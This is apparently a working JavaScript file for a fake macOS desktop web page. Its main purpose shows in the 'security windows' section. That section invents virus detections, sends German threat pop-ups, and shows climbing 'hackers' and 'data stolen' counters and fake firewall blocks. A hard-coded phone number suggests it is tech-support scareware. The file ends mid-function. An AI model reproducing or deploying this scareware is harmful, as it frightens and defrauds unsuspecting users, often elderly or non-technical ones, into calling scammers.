console.log('📜 script.js is loading...');

/********** GLOBAL CONFIGURATION **********/
const GLOBAL_PHONE_NUMBER = '0800-100-183';

/********** ELEMENTS **********/
const elements = {
  body: document.querySelector("body"),
  navbar: document.querySelector(".navbar"),
  open_spotlight: document.querySelector(".open_Search"),
  spotlight_search: document.querySelector(".spotlight_serach"),
  brightness_range: document.getElementById("brightness"),
  sound_range: document.getElementById("sound"),
  clockElement: document.getElementById("clock"),
  clockWrapper: document.querySelector(".clock"),
  widgetsPanel: document.querySelector(".widgets-panel"),
  batteryButton: document.querySelector(".battery"),
  batteryText: document.querySelector(".battery__text"),
  batteryPopup: document.querySelector(".battery__popup"),
  batteryPopupText: document.querySelector(".battery__popup header span"),
  batteryProgress: document.querySelector(".battery__progress"),
  batteryIsChargingLogo: document.querySelector(".is-charging"),
  powerSource: document.querySelector(".power-source"),
};

// Calculator App
const calculatorApp = {
  app_name: document.querySelector("#calculator"),
  window: document.querySelector(".calculator"),
  full: document.querySelector(".full"),
  close: document.querySelector(".close-cal"),
  backfull: document.querySelector(".min-cal"),
  point: document.querySelector("#point-cal"),
  opening: document.querySelector(".open-cal"),
  opening_l: document.querySelector(".open-cal-lunching"),
};

// Notes App
const notesApp = {
  app_name: document.querySelector("#Notes"),
  window: document.querySelector(".note"),
  full: document.querySelector(".full-note"),
  close: document.querySelector(".close-note"),
  backfull: document.querySelector(".backfull-note"),
  point: document.querySelector("#point-note"),
  adding: document.querySelector(".adding"),
  deleting: document.querySelector(".deleting"),
  content_typing: document.querySelector(".content__typing"),
  opening: document.querySelector(".open-note"),
  notes: document.querySelector(".content__sidebar--notes"),
};

// Terminal App
const terminalApp = {
  app_name: document.querySelector("#Terminal"),
  window: document.querySelector(".terminal"),
  full: document.querySelector(".full"),
  close: document.querySelector(".close"),
  backfull: document.querySelector(".backfull"),
  point: document.querySelector("#point-terminal"),
  content: document.querySelector(".terminal .terminal_content"),
  taskbar: document.querySelector(".terminal .window__taskbar"),
  opening: document.querySelector(".open-terminal"),
};

// VScode App

/*  Can't connect to the github.dev or vscode.dev 
const vscodeApp = {
  app_name: document.querySelector("#VScode"),
  window: document.querySelector(".Vscode"),
  close: document.querySelector(".close-Vscode"),
  backfull: document.querySelector(".backfull-Vscode"),
  full: document.querySelector(".full-Vscode"),
  point: document.querySelector("#point-vscode"),
  opening: document.querySelector(".open-vscode")
};
*/

// Maps App
const mapsApp = {
  app_name: document.querySelector("#map"),
  window: document.querySelector(".maps"),
  full: document.querySelector(".full-map"),
  close: document.querySelector(".close-map"),
  backfull: document.querySelector(".backfull-map"),
  point: document.querySelector("#point-maps"),
  opening: document.querySelector(".open-map"),
};

// Launchpad
const launchpad = {
  container: document.querySelector(".container__Window"),
  window: document.querySelector(".launchpad"),
  searchbox: document.querySelector(".launchpad .searchbox"),
  app_container: document.querySelector(".Apps-container"),
  point: document.querySelector("#point-launchpad"),
  opening: document.querySelector(".open-lunchpad"),
};

/********** LISTENERS **********/

/* 
Now it's not good cause when i set this, the default blur will be remove of everywhere.

function change_brightness() {
  var brightnessVal = elements.brightness_range.value;

  elements.body.style.filter = `brightness(${brightnessVal + '%'})`;
  elements.body.style.backdropFilter = `brightness(${brightnessVal + '%'})`;
}
*/

// Spotlight
function handleopen_spotlight() {
  if (elements.spotlight_search.style.display === "none") {
    elements.spotlight_search.style.display = "flex";
  } else {
    elements.spotlight_search.style.display = "none";
  }
}

// Notes app function start
function handleAdding() {
  const create_input = document.createElement("input");
  create_input.placeholder = "Writing name";
  notesApp.notes.appendChild(create_input);
}

function handleDeleting() {
  const inputChild = document.querySelector(".content__sidebar--notes input");
  inputChild.remove();
  notesApp.content_typing.style.display = "none";
}

function handleNotes() {
  notesApp.content_typing.style.display = "block";
}

// Notes app function end

function handleMinimize(Minimize) {
  Minimize.style.maxWidth = "80%";
  Minimize.style.minWidth = "70%";
  Minimize.style.height = "430px";
}

function handleFullScreen(maximize) {
  maximize.style.maxWidth = "95%";
  maximize.style.minWidth = "95%";
  maximize.style.height = "90%";
}

function close_window(close, point, appName) {
  close.style.display = "none";
  point.style.display = "none";
  appName.style.display = "none";
}

function open_window(open, point, appName) {
  elements.navbar.style.display = "flex";
  open.style.display = "block";
  launchpad.container.style.display = "flex";
  launchpad.window.style.display = "none";
  launchpad.point.style.display = "none";
  appName.style.display = "block";
  point.style.display = "block";
}

// Launchpad function start
// Launchpad functionality disabled
// launchpad.opening.addEventListener("click", handleOpenLaunching);

function handleOpenLaunching() {
  // Disabled - launchpad opening functionality removed
  /*
  if (launchpad.window.style.display === "none") {
    launchpad.window.style.display = "block";
    elements.navbar.style.display = "none";
    launchpad.point.style.display = "block";
  } else {
    launchpad.window.style.display = "none";
    elements.navbar.style.display = "flex";
    launchpad.point.style.display = "none";
  }
  launchpad.container.style.display = "none";
  */
}

function handleLaunchpadSearch(e) {
  for (let app of launchpad.app_container.children) {
    if (e.target.value) {
      app.style.display = "none";
      if (app.dataset.keywords.includes(e.target.value)) {
        app.style.display = "flex";
      }
    } else app.style.display = "flex";
  }
}
// Launchpad function end

// Calculator app start
function handleOpenCal_lunchpad() {
  calculatorApp.window.style.display = "block";
  calculatorApp.app_name.style.display = "block";
  launchpad.container.style.display = "flex";
  elements.navbar.style.display = "flex";
  launchpad.window.style.display = "none";
  calculatorApp.point.style.display = "block";
  launchpad.point.style.display = "none";
}
// Calculator app end

handleopen_spotlight();
handleOpenLaunching();
notesApp.adding.addEventListener("click", handleAdding);
calculatorApp.backfull.addEventListener("click", () =>
  handleMinimize(terminalApp.window)
);
notesApp.backfull.addEventListener("click", () =>
  handleMinimize(notesApp.window)
);
terminalApp.close.addEventListener("click", () =>
  close_window(terminalApp.window, terminalApp.point, terminalApp.app_name)
);
notesApp.close.addEventListener("click", () =>
  close_window(notesApp.window, notesApp.point, notesApp.app_name)
);
mapsApp.close.addEventListener("click", () =>
  close_window(mapsApp.window, mapsApp.point, mapsApp.app_name)
);
notesApp.deleting.addEventListener("click", handleDeleting);
terminalApp.full.addEventListener("click", () =>
  handleFullScreen(terminalApp.window)
);
notesApp.full.addEventListener("click", () =>
  handleFullScreen(notesApp.window)
);
/*
vscodeApp.full.addEventListener("click", () =>
  handleFullScreen(vscodeApp.window)
);
*/
mapsApp.full.addEventListener("click", () => handleFullScreen(mapsApp.window));
notesApp.window.addEventListener("click", handleNotes);
terminalApp.opening.addEventListener("click", () =>
  open_window(terminalApp.window, terminalApp.point, terminalApp.app_name)
);
notesApp.opening.addEventListener("click", () =>
  open_window(notesApp.window, notesApp.point, notesApp.app_name)
);
calculatorApp.opening.addEventListener("click", () =>
  open_window(calculatorApp.window, calculatorApp.point, calculatorApp.app_name)
);
/*
vscodeApp.opening.addEventListener("click", () =>
  open_window(vscodeApp.window, vscodeApp.point, vscodeApp.app_name)
);
*/
mapsApp.opening.addEventListener("click", () =>
  open_window(mapsApp.window, mapsApp.point, mapsApp.app_name)
);
/*
vscodeApp.close.addEventListener("click", () =>
  close_window(vscodeApp.window, vscodeApp.point, vscodeApp.app_name)
);
vscodeApp.backfull.addEventListener("click", () =>
  handleMinimize(vscodeApp.window)
);
*/
mapsApp.backfull.addEventListener("click", () =>
  handleMinimize(mapsApp.window)
);
calculatorApp.close.addEventListener("click", () =>
  close_window(
    calculatorApp.window,
    calculatorApp.point,
    calculatorApp.app_name
  )
);
calculatorApp.opening_l.addEventListener("click", handleOpenCal_lunchpad);
elements.open_spotlight.addEventListener("click", handleopen_spotlight);
launchpad.searchbox.addEventListener("input", handleLaunchpadSearch);
elements.clockWrapper.addEventListener("click", () => {
  elements.widgetsPanel.classList.toggle("open");
});

// Calculator code
// select all the buttons
const calculatorButtons = document.querySelectorAll(".input button");
// select the <input type="text" class="display" disabled> element
const calculatorDisplay = document.querySelector(".display");

// add eventListener to each button
calculatorButtons.forEach((button) => {
  button.addEventListener("click", (event) => {
    calculate(event.target.value, calculatorDisplay);
    console.log("btn");
  });
});

function lastNumber(value) {
  return value.split(/[\+\-\*\/\%]/).pop();
}

const operators = ["+", "-", "*", "/", "%"];

function calculate(value, display) {
  const latestChar = display.value[display.value.length - 1];

  const isEmpty = display.value === "0";
  const isDecimalLastOperand = lastNumber(display.value).includes(".");
  const isNumber = /^[0-9]$/.test(value);

  if (isEmpty && isNumber) {
    return (display.value = value);
  }

  switch (value) {
    case "=":
      if (!isEmpty) display.value = eval(display.value);
      return;
    case ".":
      if (!isDecimalLastOperand) display.value += ".";
      return;
    case "C":
      return (display.value = "0");
    case "+/-":
      if (
        !operators.some((operator) =>
          display.value.replace(/^-/, "").includes(operator)
        )
      )
        display.value = -1 * parseFloat(display.value);
      return;
    case "*":
    case "/":
    case "-":
    case "+":
    case "%":
      if (operators.includes(latestChar)) {
        return (display.value = display.value.slice(0, -1) + value);
      }
    // Fall through to default case
    default:
      display.value += value;
  }
}

// App draggable
$(function () {
  $(".terminal").draggable();
  $(".note").draggable();
  $(".calculator").draggable();
  $(".Vscode").draggable();
  $(".spotlight_serach").draggable();
  $(".maps").draggable();
});

// Date and time
const dateElement = document.getElementById("date");

function updateDateTime() {
  const date = new Date();
  
  // Update date in format: Mon Nov 25
  const options = { weekday: 'short', month: 'short', day: 'numeric' };
  dateElement.innerHTML = date.toLocaleDateString('en-US', options);
  
  // Update time
  let hour = date.getHours();
  let minute = checkTime(date.getMinutes());

  function checkTime(i) {
    if (i < 10) {
      i = "0" + i;
    }
    return i;
  }

  if (hour > 12) {
    hour = hour - 12;
    if (hour === 12) {
      hour = checkTime(hour);
      elements.clockElement.innerHTML = hour + ":" + minute + " AM";
    } else {
      hour = checkTime(hour);
      elements.clockElement.innerHTML = hour + ":" + minute + " PM";
    }
  } else if (hour === 12) {
    elements.clockElement.innerHTML = hour + ":" + minute + " PM";
  } else if (hour === 0) {
    elements.clockElement.innerHTML = "12:" + minute + " AM";
  } else {
    hour = checkTime(hour);
    elements.clockElement.innerHTML = hour + ":" + minute + " AM";
  }
}

function digi() {
  updateDateTime();
  // Update every second
  setInterval(updateDateTime, 1000);
}

let terminal_line_html = document.querySelector(".terminal_line").outerHTML;
let path = "~";
let dirName;
let dirs = ["Desktop", "Downloads", "Music", "Documents"];

function init_terminal_line() {
  $(".cursor").keydown(function (e) {
    if (e.keyCode === 13) {
      console.log("hello");
      e.preventDefault();
      let command = $(this).text().trim(); // Use .text() for contenteditable elements
      if (!command) return;

      let command_output = "zsh: command not found: " + command + "<br>";

      if (command.startsWith("cd ")) {
        path = command.substring(3);
        command_output = "";
      } else if (command === "ls") {
        command_output = dirs.join("\t");
      } else if (command === "pwd") {
        command_output = path + "/";
      } else if (command.startsWith("mkdir ")) {
        dirName = command.substring(6);
        dirs.push(dirName);
        command_output = "";
      } else if (command === "rmdir") {
        dirs.pop();
        command_output = "";
      } else if (command === "ps -aux") {
        command_output = "CPU = 56% <br> MEMORY = 25% <br> DISK = 34%";
      } else if (command.startsWith("cat ")) {
        command_output =
          "Lorem ipsum dolor sit amet consectetur adipisicing elit.<br> Fugiat nihil totam expedita sint necessitatibus quos ducimus.";
      } else if (command.startsWith("du -hs ")) {
        command_output = Math.floor(Math.random() * 100) + "GB";
      }

      $(this).removeAttr("contenteditable");
      $(this).removeClass("cursor");
      terminalApp.content.innerHTML += command_output; // Use .innerHTML to append string content
      let new_terminal_line_html = terminal_line_html.replace("~", path);
      terminalApp.content.innerHTML += new_terminal_line_html;
      placeCaretAtEnd(document.querySelector(".cursor"));
      init_terminal_line();
    }
  });
}

init_terminal_line();
terminalApp.content.addEventListener("click", function () {
  placeCaretAtEnd(document.querySelector(".cursor"));
});

function placeCaretAtEnd(el) {
  el.focus();
  var range = document.createRange();
  range.selectNodeContents(el);
  range.collapse(false);
  var sel = window.getSelection();
  sel.removeAllRanges();
  sel.addRange(range);
}

// Right click to desktop
document.onclick = hideMenu;
document.oncontextmenu = rightClick;

function hideMenu() {
  document.getElementById("contextMenu").style.opacity = "0";
}

function rightClick(e) {
  e.preventDefault();

  if (document.getElementById("contextMenu").style.opacity == "1") hideMenu();
  else {
    var menu = document.getElementById("contextMenu");

    menu.style.opacity = "1";
    menu.style.left = e.pageX + "px";
    menu.style.top = e.pageY + "px";
  }
}

// Loading
// const load = document.getElementById("loading");
// function lockload() {
//   load.style.display = "none";
// }

/********** Start Battery **********/
const calculateBattery = () => {
  let number = Math.floor(Math.random() * 100); // If there is any error, it will be the random default battery level
  let batteryIsCharging = false; // Charging status

  navigator
    .getBattery()
    .then(function (battery) {
      number = battery.level * 100;

      batteryIsCharging = battery.charging;
      battery.addEventListener("chargingchange", function () {
        batteryIsCharging = battery.charging;
      });
    })
    .finally(() => {
      elements.batteryText.textContent = `${number}%`;
      elements.batteryProgress.style.width = `${number}%`;
      elements.batteryPopupText.textContent = `${number}%`;

      if (number <= 20) {
        elements.batteryProgress.classList.add("battery__low");
      } else if ((number > 90 && batteryIsCharging) || batteryIsCharging) {
        elements.batteryProgress.classList.add("battery__high");
        elements.batteryIsChargingLogo.classList.add("is-charging-visibel");
        elements.powerSource.textContent = "Power Adapter";
      }
    });
};

// Battery button removed - commenting out event listener
// elements.batteryButton.addEventListener("click", () => {
//   elements.batteryPopup.classList.toggle("opened");
//   elements.batteryButton.classList.toggle("selected");
// });
/********** End Battery **********/

// Call the functions
// calculateBattery(); // Disabled - battery display removed
digi();

/********** Professional macOS Security Windows **********/

console.log('🚀 Security Windows JavaScript Loading...');

// Security Screen Elements
const securityScreens = {
  screen1: null,
  screen2: null,
  screen3: null,
  virusLog: null,
  virusCount: null,
  filesScanned: null,
  hackerCount: null,
  dataStolen: null,
  transferSpeed: null,
  firewallLog: null,
  notificationContainer: null
};

console.log('✅ Security screens object created');

// Virus Detection Variables
let virusDetectionCount = 0;
let filesScannedCount = 0;
let activeNotifications = 0;

// Network Firewall Variables
let hackerCountValue = 0;
let dataStolenValue = 0;
let transferSpeedValue = 0;

// Virus Names Database
const virusNames = [
  'Trojan.Win32.Generic',
  'Malware.OSX.Adware',
  'Ransomware.Cryptolocker',
  'Spyware.KeyLogger',
  'Backdoor.RemoteAccess',
  'Worm.Network.Propagator',
  'Rootkit.SystemHijacker',
  'Virus.MacOS.Flashback',
  'Trojan.Downloader.Agent',
  'Malware.Bundler.Installer',
  'Adware.BrowserHijacker',
  'PUP.Optional.MacKeeper',
  'Trojan.Clicker.AutoIT',
  'Spyware.DataThief',
  'Exploit.PDF.CVE',
  'Backdoor.RAT.Agent',
  'Ransomware.WannaCry',
  'Virus.Boot.Sector',
  'Trojan.Banker.Zeus',
  'Malware.OSX.Shlayer'
];

// File locations for scanning
const fileLocations = [
  '/System/Library/Frameworks',
  '/Applications/Safari.app',
  '/Users/Documents',
  '/Library/Application Support',
  '/usr/local/bin',
  '/Applications/Mail.app',
  '/System/Library/Extensions',
  '/private/var/tmp',
  '/Users/Downloads',
  '/Library/Caches'
];

// Initialize Virus Detection
function startVirusDetection() {
  // Detect first virus immediately
  setTimeout(() => {
    detectVirus();
  }, 500);
  
  // Start continuous detection
  scheduleNextVirusDetection();
  incrementFilesScanned();
}

function scheduleNextVirusDetection() {
  const randomDelay = Math.random() * 3900 + 100; // 0.1-4 seconds
  setTimeout(() => {
    detectVirus();
    scheduleNextVirusDetection();
  }, randomDelay);
}

function detectVirus() {
  virusDetectionCount++;
  const virusName = virusNames[Math.floor(Math.random() * virusNames.length)];
  const location = fileLocations[Math.floor(Math.random() * fileLocations.length)];
  const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
  
  // Update virus count
  if (securityScreens.virusCount) {
    securityScreens.virusCount.textContent = virusDetectionCount;
  }
  
  // Add to virus log
  if (securityScreens.virusLog) {
    const threatItem = document.createElement('div');
    threatItem.className = 'threat-item';
    threatItem.innerHTML = `
      <span class="threat-name">#${virusDetectionCount} - ${virusName}</span>
      <span class="threat-details">${timestamp} | ${location}</span>
    `;
    securityScreens.virusLog.insertBefore(threatItem, securityScreens.virusLog.firstChild);
    
    // Keep only last 8 entries (increased from 5)
    while (securityScreens.virusLog.children.length > 8) {
      securityScreens.virusLog.removeChild(securityScreens.virusLog.lastChild);
    }
  }
  
  // Show notification if less than 2 active
  if (activeNotifications < 2) {
    showVirusNotification(virusName);
  }
}

function incrementFilesScanned() {
  setInterval(() => {
    filesScannedCount += Math.floor(Math.random() * 50) + 10;
    securityScreens.filesScanned.textContent = filesScannedCount.toLocaleString();
  }, 500);
}

function showVirusNotification(virusName) {
  activeNotifications++;
  
  // Randomly assign threat level
  const threatLevels = [
    { level: 'Hoch', color: '#FF3B30', text: 'Bedrohungsstufe: Hoch' },
    { level: 'Mittel', color: '#FF9800', text: 'Bedrohungsstufe: Mittel' },
    { level: 'Niedrig', color: '#9E9E9E', text: 'Bedrohungsstufe: Niedrig' }
  ];
  const threat = threatLevels[Math.floor(Math.random() * threatLevels.length)];
  
  const notification = document.createElement('div');
  notification.className = 'mac-notification';
  notification.innerHTML = `
    <div class="notification-icon">
      <img src="./icon/alert.png" alt="Alert" class="notification-alert-icon">
    </div>
    <div class="notification-content">
      <div class="notification-title">Bedrohung erkannt</div>
      <div class="notification-message">${virusName}</div>
      <div class="notification-time" style="color: ${threat.color}; font-weight: 600;">${threat.text}</div>
    </div>
  `;
  
  securityScreens.notificationContainer.appendChild(notification);
  
  // Remove notification after 5 seconds
  setTimeout(() => {
    notification.style.animation = 'notificationSlide 0.3s reverse';
    setTimeout(() => {
      notification.remove();
      activeNotifications--;
    }, 300);
  }, 5000);
}

// Network Firewall Functions
function startNetworkMonitoring() {
  // Increment hacker count
  setInterval(() => {
    hackerCountValue += Math.floor(Math.random() * 2);
    securityScreens.hackerCount.textContent = hackerCountValue;
  }, 3000);
  
  // Increment data stolen
  setInterval(() => {
    dataStolenValue += Math.floor(Math.random() * 50) + 10;
    // Convert to GB when over 1024 MB
    if (dataStolenValue >= 1024) {
      const gbValue = (dataStolenValue / 1024).toFixed(2);
      securityScreens.dataStolen.textContent = gbValue + ' GB';
    } else {
      securityScreens.dataStolen.textContent = dataStolenValue + ' MB';
    }
  }, 1000);
  
  // Update transfer speed
  setInterval(() => {
    transferSpeedValue = Math.floor(Math.random() * 500) + 100;
    securityScreens.transferSpeed.textContent = transferSpeedValue + ' KB/s';
  }, 800);
  
  // Add firewall log entries
  setInterval(() => {
    addFirewallLogEntry();
  }, 4000);
  
  // Initialize network graph
  initNetworkGraph();
}

function addFirewallLogEntry() {
  if (!securityScreens.firewallLog) return;
  
  const ips = [
    '192.168.1.105', '10.0.0.47', '172.16.254.1', '203.0.113.42',
    '198.51.100.33', '192.0.2.146', '10.10.10.10', '172.31.255.255'
  ];
  const threats = [
    'Port Scan Blocked', 'Malicious Packet', 'Unauthorized Access',
    'DDoS Attempt Blocked', 'Brute Force Blocked', 'SQL Injection Blocked'
  ];
  
  const ip = ips[Math.floor(Math.random() * ips.length)];
  const threat = threats[Math.floor(Math.random() * threats.length)];
  
  const entry = document.createElement('div');
  entry.className = 'log-item';
  entry.textContent = `${ip} - ${threat}`;
  
  securityScreens.firewallLog.insertBefore(entry, securityScreens.firewallLog.firstChild);
  
  // Keep only last 6 entries (to show all color variations)
  while (securityScreens.firewallLog.children.length > 6) {
    securityScreens.firewallLog.removeChild(securityScreens.firewallLog.lastChild);
  }
}

// Network Graph
let networkGraphData = [];
let networkGraphAnimationFrame;

function initNetworkGraph() {
  const canvas = document.getElementById('networkGraph');
  if (!canvas) {
    console.error('Network graph canvas not found');
    return;
  }
  
  const ctx = canvas.getContext('2d');
  const width = 420;
  const height = 100;
  const dpr = window.devicePixelRatio || 1;
  
  // Set canvas size
  canvas.width = width * dpr;
  canvas.height = height * dpr;
  canvas.style.width = width + 'px';
  canvas.style.height = height + 'px';
  ctx.scale(dpr, dpr);
  
  // Initialize data points
  for (let i = 0; i < 50; i++) {
    networkGraphData.push(Math.random() * 60 + 40);
  }
  
  function drawGraph() {
    ctx.clearRect(0, 0, width, height);
    
    // Draw grid
    ctx.strokeStyle = '#e5e5e7';
    ctx.lineWidth = 1;
    for (let i = 0; i <= 3; i++) {
      const y = (height / 3) * i;
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(width, y);
      ctx.stroke();
    }
    
    // Draw line
    ctx.strokeStyle = '#FF3B30';
    ctx.lineWidth = 2;
    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';
    
    ctx.beginPath();
    const pointWidth = width / (networkGraphData.length - 1);
    
    networkGraphData.forEach((value, index) => {
      const x = index * pointWidth;
      const y = height - (value / 100) * (height - 15) - 8;
      
      if (index === 0) {
        ctx.moveTo(x, y);
      } else {
        ctx.lineTo(x, y);
      }
    });
    
    ctx.stroke();
    
    // Fill
    ctx.lineTo(width, height);
    ctx.lineTo(0, height);
    ctx.closePath();
    const gradient = ctx.createLinearGradient(0, 0, 0, height);
    gradient.addColorStop(0, 'rgba(255, 59, 48, 0.2)');
    gradient.addColorStop(1, 'rgba(255, 59, 48, 0.05)');
    ctx.fillStyle = gradient;
    ctx.fill();
    
    // Update data
    networkGraphData.shift();
    networkGraphData.push(Math.random() * 60 + 40);
    
    networkGraphAnimationFrame = requestAnimationFrame(drawGraph);
  }
  
  drawGraph();
}

// Click to front behavior - COMPLETELY FIXED
let currentTopZIndex = 105;
let resetTimeouts = {};

// Store original z-index values
const originalZIndexes = {
  'screen-1': 103,  // Critical Alert (TOP/FRONT)
  'screen-2': 102,  // Network Firewall (MIDDLE)
  'screen-3': 101   // Antivirus (BOTTOM/BACK)
};

function bringToFront(element, name, event) {
  if (!element) {
    console.error(`❌ Cannot bring ${name} to front - element not found`);
    return;
  }
  
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`🖱️ BRING TO FRONT: ${name}`);
  if (event && event.target) {
    console.log(`   Triggered by:`, event.target);
  }
  
  // Clear existing timeout for this screen
  if (resetTimeouts[name]) {
    clearTimeout(resetTimeouts[name]);
    console.log(`   Cleared existing timeout`);
  }
  
  // Store original z-index
  const originalZIndex = originalZIndexes[name];
  const currentZ = element.style.zIndex || getComputedStyle(element).zIndex;
  
  console.log(`   Current z-index: ${currentZ}`);
  console.log(`   New z-index: ${currentTopZIndex + 1}`);
  
  // Bring to front
  currentTopZIndex++;
  element.style.zIndex = currentTopZIndex;
  element.style.position = 'fixed';
  
  console.log(`✅ ${name} is now at z-index: ${element.style.zIndex}`);
  console.log(`   Will reset to ${originalZIndex} in 10 seconds`);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  
  // Reset after 10 seconds
  resetTimeouts[name] = setTimeout(() => {
    console.log(`⏰ TIMEOUT: Resetting ${name} to z-index: ${originalZIndex}`);
    element.style.zIndex = originalZIndex;
  }, 10000);
}

function setupClickToFront() {
  console.log('🔧 Click-to-front is now handled by jQuery in draggable setup');
  console.log('✅ All windows will come to front when clicked');
  console.log('📍 Original z-indexes:', originalZIndexes);
  
  // Log current state for debugging
  setTimeout(() => {
    console.log('🧪 Window verification:');
    console.log('  Screen 1:', securityScreens.screen1 ? '✅ Found' : '❌ Not found');
    console.log('  Screen 2:', securityScreens.screen2 ? '✅ Found' : '❌ Not found');
    console.log('  Screen 3:', securityScreens.screen3 ? '✅ Found' : '❌ Not found');
    
    if (securityScreens.screen1) {
      console.log('  Screen 1 z-index:', securityScreens.screen1.style.zIndex || getComputedStyle(securityScreens.screen1).zIndex);
    }
    if (securityScreens.screen2) {
      console.log('  Screen 2 z-index:', securityScreens.screen2.style.zIndex || getComputedStyle(securityScreens.screen2).zIndex);
    }
    if (securityScreens.screen3) {
      console.log('  Screen 3 z-index:', securityScreens.screen3.style.zIndex || getComputedStyle(securityScreens.screen3).zIndex);
    }
  }, 500);
}

// Make security screens draggable AND clickable
$(function () {
  console.log('🎯 Setting up draggable windows with jQuery...');
  
  // Screen 1
  $(".screen-1").draggable({ 
    handle: ".mac-titlebar",
    containment: "window",
    scroll: false,
    distance: 10,
    start: function(event, ui) {
      console.log('Drag started on screen-1');
      if (securityScreens.screen1) {
        bringToFront(securityScreens.screen1, 'screen-1', event);
      }
    }
  }).on('mousedown', function(e) {
    console.log('💥 jQuery mousedown on screen-1');
    if (!$(e.target).hasClass('btn-mac') && !$(e.target).closest('.btn-mac').length) {
      if (securityScreens.screen1) {
        bringToFront(securityScreens.screen1, 'screen-1', e);
      }
    }
  });
  
  // Screen 2
  $(".screen-2").draggable({ 
    handle: ".mac-titlebar",
    containment: "window",
    scroll: false,
    distance: 10,
    start: function(event, ui) {
      console.log('Drag started on screen-2');
      if (securityScreens.screen2) {
        bringToFront(securityScreens.screen2, 'screen-2', event);
      }
    }
  }).on('mousedown', function(e) {
    console.log('💥 jQuery mousedown on screen-2');
    if (!$(e.target).hasClass('btn-mac') && !$(e.target).closest('.btn-mac').length) {
      if (securityScreens.screen2) {
        bringToFront(securityScreens.screen2, 'screen-2', e);
      }
    }
  });
  
  // Screen 3
  $(".screen-3").draggable({ 
    handle: ".mac-titlebar",
    containment: "window",
    scroll: false,
    distance: 10,
    start: function(event, ui) {
      console.log('Drag started on screen-3');
      if (securityScreens.screen3) {
        bringToFront(securityScreens.screen3, 'screen-3', event);
      }
    }
  }).on('mousedown', function(e) {
    console.log('💥 jQuery mousedown on screen-3');
    if (!$(e.target).hasClass('btn-mac') && !$(e.target).closest('.btn-mac').length) {
      if (securityScreens.screen3) {
        bringToFront(securityScreens.screen3, 'screen-3', e);
      }
    }
  });
  
  console.log('✅ Draggable windows and click handlers configured');
});

// Initialize all security features
function initSecurityScreens() {
  console.log('=== Initializing Professional macOS Security Windows ===');
  
  // Re-query elements to ensure they're found
  securityScreens.screen1 = document.querySelector('.screen-1');
  securityScreens.screen2 = document.querySelector('.screen-2');
  securityScreens.screen3 = document.querySelector('.screen-3');
  securityScreens.virusLog = document.getElementById('virus-log');
  securityScreens.virusCount = document.getElementById('virus-count');
  securityScreens.filesScanned = document.getElementById('files-scanned');
  securityScreens.hackerCount = document.getElementById('hacker-count');
  securityScreens.dataStolen = document.getElementById('data-stolen');
  securityScreens.transferSpeed = document.getElementById('transfer-speed');
  securityScreens.firewallLog = document.getElementById('firewall-log');
  securityScreens.notificationContainer = document.getElementById('notification-container');
  
  console.log('Screen 1 (Critical Alert - TOP):', securityScreens.screen1);
  console.log('Screen 2 (Network Firewall - MIDDLE):', securityScreens.screen2);
  console.log('Screen 3 (Antivirus - BOTTOM):', securityScreens.screen3);
  console.log('Notification Container:', securityScreens.notificationContainer);
  
  if (!securityScreens.screen1 || !securityScreens.screen2 || !securityScreens.screen3) {
    console.error('❌ One or more security screens not found!');
    return;
  }
  
  if (!securityScreens.virusLog || !securityScreens.virusCount) {
    console.error('Antivirus elements not found!');
  }
  
  if (!document.getElementById('networkGraph')) {
    console.error('Network graph canvas not found!');
  }
  
  if (!securityScreens.notificationContainer) {
    console.error('❌ Notification container not found!');
  }
  
  // SIMPLE DIRECT CLICK HANDLERS - THIS WILL WORK
  console.log('🔧 Adding DIRECT click handlers...');
  
  securityScreens.screen1.addEventListener('click', function(e) {
    if (e.target.classList.contains('btn-mac') || e.target.closest('.btn-mac')) return;
    console.log('🎯 SCREEN 1 CLICKED!');
    this.style.outline = '3px solid red';
    setTimeout(() => { this.style.outline = 'none'; }, 300);
    bringToFront(securityScreens.screen1, 'screen-1', e);
  }, true);
  
  securityScreens.screen2.addEventListener('click', function(e) {
    if (e.target.classList.contains('btn-mac') || e.target.closest('.btn-mac')) return;
    console.log('🎯 SCREEN 2 CLICKED!');
    this.style.outline = '3px solid red';
    setTimeout(() => { this.style.outline = 'none'; }, 300);
    bringToFront(securityScreens.screen2, 'screen-2', e);
  }, true);
  
  securityScreens.screen3.addEventListener('click', function(e) {
    if (e.target.classList.contains('btn-mac') || e.target.closest('.btn-mac')) return;
    console.log('🎯 SCREEN 3 CLICKED!');
    this.style.outline = '3px solid red';
    setTimeout(() => { this.style.outline = 'none'; }, 300);
    bringToFront(securityScreens.screen3, 'screen-3', e);
  }, true);
  
  console.log('✅ Direct click handlers added to all 3 screens');
  
  // Also setup jQuery handlers
  setupClickToFront();
  
  // Then start animations
  startVirusDetection();
  startNetworkMonitoring();
  
  console.log('=== Security screens initialized successfully ===');
  console.log('💡 CLICK ANY WINDOW NOW - YOU SHOULD SEE "🎯 SCREEN X CLICKED!"');
}

// Expose test functions for debugging
window.testClickToFront = function() {
  console.log('🧪 Manual test - bringing Screen 2 to front...');
  if (securityScreens.screen2) {
    bringToFront(securityScreens.screen2, 'screen-2', { target: securityScreens.screen2 });
  } else {
    console.error('Screen 2 not found!');
  }
};

window.testScreen1 = function() {
  console.log('🧪 Testing Screen 1...');
  if (securityScreens.screen1) {
    securityScreens.screen1.style.outline = '5px solid lime';
    bringToFront(securityScreens.screen1, 'screen-1', {});
    setTimeout(() => { securityScreens.screen1.style.outline = 'none'; }, 2000);
  }
};

window.testScreen2 = function() {
  console.log('🧪 Testing Screen 2...');
  if (securityScreens.screen2) {
    securityScreens.screen2.style.outline = '5px solid lime';
    bringToFront(securityScreens.screen2, 'screen-2', {});
    setTimeout(() => { securityScreens.screen2.style.outline = 'none'; }, 2000);
  }
};

window.testScreen3 = function() {
  console.log('🧪 Testing Screen 3...');
  if (securityScreens.screen3) {
    securityScreens.screen3.style.outline = '5px solid lime';
    bringToFront(securityScreens.screen3, 'screen-3', {});
    setTimeout(() => { securityScreens.screen3.style.outline = 'none'; }, 2000);
  }
};

console.log('✅ Test functions available: testScreen1(), testScreen2(), testScreen3()');

// CPU Monitor Variables
let cpuUsageValue = 0;
let memoryUsageValue = 0;

// Initialize CPU Monitor
function startCPUMonitor() {
  const cpuUsageElement = document.getElementById('cpu-usage');
  const memoryUsageElement = document.getElementById('memory-usage');
